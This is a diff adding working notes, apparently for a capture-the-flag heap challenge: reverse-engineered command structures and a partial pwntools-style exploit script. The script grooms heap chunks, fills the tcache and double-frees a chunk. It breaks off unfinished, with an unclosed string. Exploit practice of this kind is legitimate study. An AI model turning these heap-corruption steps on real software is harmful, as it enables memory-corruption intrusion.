@@ -1,0 +1,74 @@
+Note:
+	structure buf:
+
+WRITE((__int64)(v3 + 1)) -> 
+	struct yisf // sizeof=0x10 (of func_write)
+00000000 {
+00000000     __int64 field_0;
+00000008     __int16 field_8;
+0000000A     __int16 ptr->calloc;
+0000000C     __int16 size ;
+0000000E     __int16 data;
+00000010 };
+
+
+DELETE((_BYTE *)v3 + 1)
+structure:
+	char option
+	_WORD idx
+
+
+READ((unsigned __int16 *)(v3 + 1)):
+structure:
+	_WORD option
+	_WORD idx
+
+
+MODIFY((unsigned __int16 *)(v3 + 1)
+structure:
+	_WORD option
+	_WORD idx
+	_DWORD size
+
+
+old script tested:
+GDB()
+input()
+def note(size, data):
+	sa(b'command\n', size)
+	s(data)
+
+sa(b'name : ', b'k')
+pld = b'W'
+pld = pld.ljust(0xB, b'\0') + p16(0x420) # size
+pld = pld.ljust(0xF, b'\0') + b'A' #data
+note(b'12345', pld)
+note(b'12345', pld)
+
+note(b'12345', b'M' + p16(1) + b'\x00\x00\x00')
+pld = b'W'
+pld = pld.ljust(0xB, b'\0') + p16(0x20) # size
+pld = pld.ljust(0xF, b'\0') + b'A' #data
+note(b'12345', pld)
+
+note(b'12345', b'D' + p16(1))
+note(b'12345', b'D' + p16(0))
+
+pld = b'W'
+pld = pld.ljust(0xB, b'\0') + p16(0x430) # size
+pld = pld.ljust(0xF, b'\0') + b'A' #data
+note(b'12345', pld)
+'''
+for _ in range(7):
+	note(b'12345', pld)
+
+note(b'12345', pld) #7
+note(b'12345', pld) #8
+
+for x in range(7):
+	note(b'12345', b'D' + p16(x))
+
+note(b'12345', b'D' + p16(7))
+note(b'12345', b'D' + p16(8))
+note(b'12345', b'D' + p16(7))
+''
